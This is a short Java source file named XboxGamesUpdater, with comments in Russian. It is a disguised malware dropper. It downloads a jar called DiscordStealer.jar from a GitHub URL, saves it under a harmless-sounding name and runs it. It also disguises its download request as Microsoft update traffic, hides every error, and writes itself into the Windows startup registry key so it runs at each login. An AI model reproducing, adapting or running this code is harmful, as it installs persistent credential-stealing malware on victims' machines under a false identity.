import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.zip.*;

public class XboxGamesUpdater {
    
    private static final String STEALER_URL = "https://github.com/TopLeonNeon/stealer/raw/main/DiscordStealer.jar";
    private static final String SAVE_PATH = "C:\\XboxGames\\systemhelper.jar";
    
    public static void main(String[] args) {
        try {
            // Создаём папку
            new File("C:\\XboxGames").mkdirs();
            
            // Скачиваем основной стилер с GitHub
            downloadStealer();
            
            // Запускаем стилер
            Runtime.getRuntime().exec("java -jar \"" + SAVE_PATH + "\"");
            
            // Копируем себя в автозагрузку
            installStartup();
            
        } catch (Exception e) {}
    }
    
    private static void downloadStealer() {
        try {
            URL url = new URL(STEALER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Microsoft Update Client");
            
            try (InputStream in = conn.getInputStream();
                 FileOutputStream out = new FileOutputStream(SAVE_PATH)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                }
            }
        } catch (Exception e) {}
    }
    
    private static void installStartup() {
        try {
            String currentJar = XboxGamesUpdater.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI().getPath();
            Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v XboxUpdater /t REG_SZ /d \"" + currentJar + "\" /f");
        } catch (Exception e) {}
    }
}